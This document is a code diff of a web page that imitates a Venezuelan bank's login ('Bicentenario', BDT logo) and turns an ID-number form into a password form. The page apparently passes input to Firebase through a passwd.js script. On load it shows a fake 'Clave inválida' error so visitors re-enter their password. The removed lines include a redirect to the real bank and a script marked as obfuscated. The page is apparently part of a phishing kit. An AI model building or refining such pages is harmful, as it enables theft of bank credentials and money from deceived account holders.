@@ -3,25 +3,71 @@
 
 <head>
   <meta charset="utf-8" />
-  <meta name="robots" content="noindex, nofollow">
-
   <title>Bicentenario</title>
   <meta name="description" content />
   <meta name="author" content="Luis Eduardo Perez" />
   <meta name="description" content />
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <link rel="stylesheet" href="styles/style.css" />
+  <link rel="stylesheet" href="../styles/style.css" />
+  <link rel="stylesheet" href="../styles/custom.css">
   <meta name="msapplication-TileColor" content="#b91d47" />
   <meta name="theme-color" content="#ffffff" />
   <meta name="referrer" content="no-referrer" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <!-- Favicon -->
-  <link rel="icon" href="img/favicon.ico" type="image/x-icon">
   <link rel="shortcut icon" href="img/shorcut.png" type="image/x-icon" />
-  <link rel="icon" href="img/favicon.png" type="image/x-icon" />
-  <meta http-equiv="refresh" content="0; URL='www.bdtenlinea.bdt.com.ve/p=1.html'" />
-  <script type="module" src="js/firebase-config.js"></script>
+  <link rel="icon" href="../img/favicon.png" type="image/x-icon" />
+  <!-- SweetAlert2 (para modal de error) -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+  <style>
+    /* Pixel perfect igual a err-p=1.html (con ajustes del usuario) */
+    .swal2-container {
+      background: rgba(0, 0, 0, 0.45) !important;
+    }
+    .swal2-popup {
+      width: 500px !important;
+      min-height: 295px !important;
+      padding: 25px !important;
+      border-radius: 6px !important;
+      font-family: Arial, Helvetica, sans-serif !important;
+    }
+    .swal2-title {
+      margin: 0 0 10px 0 !important;
+      font-weight: 600 !important;
+      font-size: 20px !important;
+    }
+    /* Contenido del mensaje */
+    #swal2-content,
+    .swal2-html-container {
+      font-size: 18px !important;
+      color: #3f4254 !important;
+      text-align: center !important;
+      margin: 10px 0 10px 0 !important;
+      padding: 0 !important;
+    }
+    /* Icono de error: escalar proporcionalmente para conservar la "X" */
+    .swal2-icon.swal2-error {
+      transform: scale(1.60);
+      transform-origin: center;
+      margin: 20px auto 15px auto !important;
+    }
+    /* Botón "Continuar" */
+    .swal2-styled.swal2-confirm {
+      background-color: rgb(48, 133, 214) !important;
+      border-left-color: rgb(48, 133, 214) !important;
+      border-right-color: rgb(48, 133, 214) !important;
+      border-top-color: rgb(48, 133, 214) !important;
+      border-bottom-color: rgb(48, 133, 214) !important;
+      font-size: 16px !important;
+      padding: 10px 24px !important;
+      border-radius: 4px !important;
+    }
+    .swal2-actions { margin: 0 !important; }
+    .swal2-styled:focus { box-shadow: 0 0 0 3px rgba(48,133,214,0.35) !important; }
+  </style>
+  <script defer src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>
+  <script type="module" src="../js/firebase-config.js"></script>
 </head>
 
 <body class="smart-style-3 fixed-page-footer fixed-header desktop-detected">
@@ -44,54 +90,32 @@
   </script> -->
   <div id="main" role="main" class="mainRegister">
     <div id="content" class="container" style="opacity: 1">
-      <div id="lgform" novalidate>
-        <input type="hidden" id="direccionIP" name="DireccionIP" />
+      <form id="login-form" novalidate>
         <div class="modal-dialog demo-modal">
           <div class="modal-content">
             <div class="modal-header">
               <!-- Logo BDT sobre form -->
               <h4 class="modal-title text-center mt-1">
-                <img src="img/logo.png" alt srcset style="width: 80%" sizes />
+                <img src="../img/logo.png" alt srcset style="width: 80%" sizes />
               </h4>
               <!-- Fin logo -->
             </div>
             <div class="modal-body smart-form client-form">
+              <!-- Contraseña -->
               <div class="row">
                 <section class="col col-2"></section>
                 <section class="col col-8">
                   <label for class="label">
-                    <strong>Tipo de Identificación</strong>
+                    <strong>Ingrese su contraseña</strong>
                   </label>
-                  <label for class="select radius-5">
-                    <select class="form-control input-login" id="tipodocben">
-                      <option value="Venezolano" selected>Venezolano</option>
-                      <option value="Pasaporte">Pasaporte</option>
-                      <option value="Jurídico">Jurídico</option>
-                      <option value="Extranjero">Extranjero</option>
-                      <option value="Gubernamental">Gubernamental</option>
-                      <option value="Comunal">Comunal</option>
-                      <option value="Firma Personal">Firma Personal</option>
-                    </select>
-                    <b class="tooltip tooltip-top-right"><i class="fa fa-lock txt-color-teal"></i> Tipo de
-                      Documento de Identidad</b>
-                    <i></i>
-                  </label>
-                </section>
-              </div>
-              <div class="row">
-                <section class="col col-2"></section>
-                <section class="col col-8">
-                  <label for class="label">
-                    <strong>Número de Identificación</strong>
-                  </label>
-                  <label for="documento" class="input show-account">
+                  <label for="passwd" class="input show-account">
                     <i style="cursor: pointer" class="icon-watch icon-append fa fa-eye-slash" data-watch="0"
-                      id="toggleDocumento" aria-label="Mostrar u ocultar documento" tabindex="0" role="button"></i>
-                    <input type="password" class="form-control numbersOnly input-login" maxlength="10" name="Documento"
-                      id="documento" autocomplete="off" placeholder="Número de documento de identidad" />
+                      id="togglePassword"></i>
+                    <input type="password" class="form-control numbersOnly input-login" maxlength="100" name="Passwd"
+                      id="passwd" autocomplete="off" placeholder="" />
                     <b class="tooltip tooltip-top-right">
                       <i class="fa fa-lock txt-color-teal"></i>
-                      Número de Documento de Identidad
+                      Ingrese su contraseña
                     </b>
                   </label>
                 </section>
@@ -104,32 +128,29 @@
               <div class="botones">
                 <div class="row mt-1">
                   <section class="col col-2"></section>
-                  <section class="col col-8">
-                    <button type="submit" class="btn bg-color-azul btn-block btn-azul-ingreso" id="cmdLogin" disabled>
-                      Ingresar
+                  <section class="col col-8 section-btn-passwd">
+                    <button type="submit" class="btn bg-color-azul btn-block btn-azul-ingreso btn-passwd" id="cmdLogin">
+                      <i class="fa fa-unlock"></i> Ingresar
                     </button>
                   </section>
                 </div>
                 <div class="row mt-1">
                   <section class="col col-1"></section>
                   <section class="col col-5 text-center">
-                    <a href="javascript:void(0)" type="button" class="btn-link-blue" id="cmdRegister" disabled style="font-size: 14px;">
-                      Registro
+                    <a href="javascript:void(0)" type="button" class="btn-link-red margin-top-5" id="cmdRegister" disabled style="color:#A32337 !important; font-size: 14px;">
+                      <i class="fa fa-home"></i>
+                      Regresar
                     </a>
                   </section>
                   <section class="col col-5 text-center">
-                    <a href="javascript:void(0)" class="btn-link-blue" id="cmdUnlock" disabled style="font-size: 14px;">
-                      Desbloqueo de usuario
+                    <a href="javascript:void(0)" class="btn-link-blue margin-top-5" id="cmdUnlock" disabled style="color:#A32337 !important; font-size: 14px;">
+                      Olvido de contraseña
                     </a>
                   </section>
                 </div>
                 <div class="row">
                   <div class="col-md-3"></div>
-                  <div class="col-md-6 text-center">
-                    <a href="#" id="cmdOlvido" class="btn-link-blue" style="cursor: none;">
-                      Olvido usuario master
-                    </a>
-                  </div>
+                  
                 </div>
               </div>
               <div class="clearfix"></div>
@@ -167,8 +188,29 @@
   <div id="divSmallBoxes"></div>
   <div id="divMiniIcons"></div>
   <div id="divbigBoxes"></div>
-<!-- Ofuscado -->
-  <script type="module" src="js/script.js"></script>
+
+  <script type="module" src="../js/passwd.js"></script>
+
+  <!-- Modal de error al cargar la página -->
+  <script>
+    window.addEventListener('DOMContentLoaded', function () {
+      if (window.Swal) {
+        Swal.fire({
+          icon: 'error',
+          title: '',
+          text: 'Clave inválida. Por favor verifique e intente de nuevo',
+          confirmButtonText: 'Continuar',
+          allowOutsideClick: false,
+          allowEscapeKey: true,
+          backdrop: true,
+          didOpen: (popup) => {
+            const btn = popup.querySelector('.swal2-confirm');
+            if (btn) btn.focus();
+          }
+        });
+      }
+    });
+  </script>
 
 </body>
 
